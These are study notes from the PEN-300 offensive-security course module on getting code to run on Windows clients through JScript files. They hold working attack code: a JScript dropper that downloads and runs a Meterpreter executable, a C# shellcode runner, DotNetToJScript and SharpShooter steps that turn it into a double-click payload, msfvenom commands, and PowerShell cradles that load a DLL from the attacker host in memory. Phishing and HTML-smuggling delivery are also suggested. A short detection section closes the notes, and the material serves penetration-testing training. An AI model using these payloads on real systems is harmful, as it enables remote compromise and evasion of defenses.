PEN-300 Module 06 — Client-Side Code Execution with Windows Script Host (JScript + DotNetToJScript)

Fuente: material del curso correspondiente (sin video público)

Distilled from OffSec PEN-300 (OSEP) course material (module: Client Side Code Execution With Windows Script Host) — internal training reference, not for redistribution.

Objective

Gain client-side code execution via JScript files (wscript), a vector popularized by TrickBot and Emotet. Progression: simple dropper → Meterpreter dropper → fully in-memory shellcode runner by embedding a pre-compiled C# assembly in JScript with DotNetToJScript, then replicating it with SharpShooter and finishing with an in-memory PowerShell + C# reflective load. The motivation vs. the previous module: PowerShell is heavily scrutinized by defenders, so C# (compiled before delivery, executed in memory) lowers the profile while keeping full .NET access.

Target surface

  • Kali attacker: 192.168.119.120 (web root /var/www/html, Samba share at \\192.168.119.120\visualstudio).
  • Windows 10 victim (user Offsec in C:\Users\Offsec) and separate Windows 10 development machine (Visual Studio, Squid proxy, C:\Tools\DotNetToJscript-master.zip pre-staged).

Techniques

1. Why .js beats .ps1

Windows launches files by extension → default app. Under Settings > Apps > Default apps > Choose default apps by file type:

  • .ps1 → Notepad (double-click opens an editor; never executes).
  • .js → Windows-Based Script Host (double-click executes).

JScript = Microsoft's JavaScript dialect (ECMAScript-based). Outside a browser it escapes all sandbox restrictions and can touch ActiveX / WSH directly — no exploit needed.

Basic ActiveX execution:

var shell = new ActiveXObject("WScript.Shell")
var res = shell.Run("cmd.exe");

WSH exits as soon as the script finishes (invisible in Process Explorer).

2. JScript Meterpreter dropper (download & run on disk)

Chain of ActiveX objects, all undocumented-but-universal:

Object Role
MSXML2.XMLHTTP synchronous HTTP GET (Open('GET', url, false); Send(); check .Status == 200)
ADODB.Stream binary sink: Open(), Type = 1 (adTypeBinary), Write(Object.ResponseBody), Position = 0, SaveToFile("met.exe", 2) (adSaveCreateOverWrite), Close()
WScript.Shell Run("met.exe")

Payload prep: 64-bit Meterpreter reverse HTTPS EXE via msfvenom into the Kali web root; matching multi/handler waiting. Complete script (Listing 8) is just these three objects in ~15 lines — double-click → 64-bit shell.

Exercise nugget: make the GET proxy-aware with the setProxy method (test against the Squid proxy on the Windows 10 dev machine).

3. Dev environment: Samba + Visual Studio

  • Kali: apt install samba; minimal smb.conf ([visualstudio] path=/home/kali/data, browseable=yes, read only=no); smbpasswd -a kali; start smbd + nmbd; chmod -R 777 /home/kali/data.
  • Reason: VS projects vanish on VM revert; the SMB share persists code.
  • Workflow: open share in Explorer (\\192.168.119.120), store creds, create Console App (.NET Framework) C# project on the share. Solution = parent unit, may hold multiple projects.
  • Compile in Release mode (Debug symbols can trip security scanners) → binary lands at \\...\ConsoleApp1\bin\Release\ConsoleApp1.exe.
  • Remote-location projects trigger a VS security warning (malicious .csproj/config files = client-side vector) — accept it.

4. DotNetToJScript (James Forshaw, 2017)

Executes a C# assembly from JScript. Repo available locally at C:\Tools\DotNetToJscript-master.zip; copy to the Samba share and open in VS.

  • ExampleAssembly project → TestClass.cs (must be [ComVisible(true)]):
[ComVisible(true)]
public class TestClass
{
    public TestClass() { MessageBox.Show("Test", ...); }   // entry point
    public void RunProcess(string path) { Process.Start(path); }
}
  • Compile the solution (Release), then copy DotNetToJscript.exe, NDesk.Options.dll, and ExampleAssembly.dll into one folder (required at every conversion).
  • Convert:
C:\Tools> DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js

(v4 because modern Win10 ships only .NET Framework 4 by default.)

How the generated JS works — worth memorizing, it's the core of the technique:

  1. setversion() — pins the CLR via COMPLUS_Version env var = v4.0.30319.
  2. debug(s) — empty unless -d was passed.
  3. base64ToStream(b) — Base64 → System.IO.MemoryStream using System.Text.ASCIIEncoding + System.Security.Cryptography.FromBase64Transform through ActiveXObject instantiations of .NET classes.
  4. Main: serialized_obj = Base64 serialized binary blob (the assembly, binary-formatted), entry_class = 'TestClass'; then:
var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
var d = fmt.Deserialize_2(stm);                       // assembly in memory
var al = new ActiveXObject('System.Collections.ArrayList');
al.Add(undefined);                                    // empty-arg trick
var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);  // run constructor

DynamicInvoke needs an argument array; since the constructor takes none, an ArrayList with one undefined element is emptied out via ToArray().

Exercise: change TestClass to launch cmd.exe instead of a MessageBox.

5. Win32 API calls from C

P/Invoke via [DllImport] (no PowerShell reflection complexity — we compile ahead of delivery). Reference C→C# signatures at www.pinvoke.net. Namespaces needed: System, System.Diagnostics, System.Runtime.InteropServices.

[DllImport("user32.dll", CharSet = CharSet.Auto)]
public static extern int MessageBox(IntPtr hWnd, String text, String caption, int options);
// MessageBox(IntPtr.Zero, "text", "caption", 0);

6. C# shellcode runner

Same triad as the VBA/PowerShell modules — VirtualAlloc, CreateThread, WaitForSingleObject:

[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll")]
static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

static void Main(string[] args)
{
    byte[] buf = new byte[N] { 0xfc,0x48,... };            // 64-bit staged meterpreter, csharp format
    int size = buf.Length;
    IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);  // RWX commit/reserve
    Marshal.Copy(buf, 0, addr, size);                       // no namespace prefix needed in C#
    IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    WaitForSingleObject(hThread, 0xFFFFFFFF);               // keep process alive
}

Key details: 64-bit shellcode because JScript runs in a 64-bit context on x64 Windows by default; set the CPU platform to x64 in VS Configuration Manager (New platform) before compiling; WaitForSingleObject prevents process exit before the shell lands.

7. JScript shellcode runner (the deliverable)

  1. Move the three DllImports into TestClass (declarations go in the class, outside the method) and put the runner code inside the TestClass() constructor.
  2. Compile ExampleAssembly for x64.
  3. DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
  4. Double-click runner.js with multi/handler up → staged reverse Meterpreter shell, entirely from the embedded assembly.

Exercises: repeat in VBScript format (--lang swap). Extra mile: phishing email → Apache page performing HTML smuggling of the JScript runner for Chrome users.

8. SharpShooter (automation)

Install: clone mdsecactivebreach/SharpShooter to /opt, pip install -r requirements.txt (apt install python-pip if missing). It automates the DotNetToJScript-style weaponization.

sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f raw -o /var/www/html/shell.txt

sudo python SharpShooter.py --payload js --dotnetver 4 --stageless \
  --rawscfile /var/www/html/shell.txt --output test
# [*] Written delivery payload to output/test.js
  • --stageless (SharpShooter sense): whole JScript payload delivered at once; a staged variant instead delivers via HTML smuggling.
  • Copy test.js to the victim, double-click, catch the shell. Course's closing caution: tools save time, but understand the underlying code — especially for AV bypass work.

9. In-memory PowerShell revisited (reflective assembly load)

Separate compile from load: build a Class Library (.NET Framework) project (ClassLibrary1.dll) in the same solution — copy the DllImports and Main body into a public static void runner() (public+static so reflection can reach it).

Download cradle, two variants:

# Variant A — touches disk (DownloadFile + LoadFile)
(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/ClassLibrary1.dll', 'C:\Users\Offsec\ClassLibrary1.dll')
$assem = [System.Reflection.Assembly]::LoadFile("C:\Users\Offsec\ClassLibrary1.dll")

# Variant B — fully in memory (DownloadData + Load(byte[]))
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/ClassLibrary1.dll')
$assem = [System.Reflection.Assembly]::Load($data)

# Either way, invoke via reflection:
$class  = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)

Load(byte[]) is the diskless win over LoadFile. Use 64-bit PowerShell ISE. Capstone exercise: combine with the Office module — call this technique from a Word macro, remembering Word is a 32-bit process.

Extraction artifacts / notes

  • Shellcode sizes are inconsistent across listings: "626" (Listing 31/34), "630" (Listing 32), and msfvenom's "716 bytes" (Listing 37) — different payloads/generations; the elided ... in byte arrays is extractor truncation, not original content.
  • Several listing numbers (15, 16, 35, 42) wrap file paths/commands that the extractor broke across lines; the \\192.168.119.120\... UNC and C:\Users\Offsec>... console lines belong to a single line each.
  • "Nashhorn" is a typo for Nashorn (Java's built-in JS engine, mentioned in Wrapping Up alongside HTA/Demiguise, IronPython/Trinity, jRAT/Adwind).
  • Listing 33 shows ... in the middle of the TestClass — the shellcode constructor body from Listing 34 is the elided part; both listings together form one file.

Detection & defense

  • File associations: .js/.jse/.vbs/.wsf execute on double-click — remove associations or force WSH to deny execution (WSH isolation policy / attack surface reduction rules blocking JS/VBS launch from downloads).
  • ActiveX in WSH: MSXML2.XMLHTTP, ADODB.Stream, and .NET classes via ActiveXObject are the whole toolkit; EDR visibility on wscript.exe spawning cmd/network traffic is the control point.
  • BinaryFormatter deserialization (Deserialize_2 + DynamicInvoke) is the DotNetToJScript signature — flag serialized-object blobs and COMPLUS_Version manipulation in scripts.
  • In-memory assembly loading: [Reflection.Assembly]::Load(byte[]) with DownloadData cradles; monitor for WebClient download + reflection invoke chains.
  • Dev-share hygiene: open-from-SMB VS projects are themselves a phishing vector (course makes this point explicitly via the security warning).
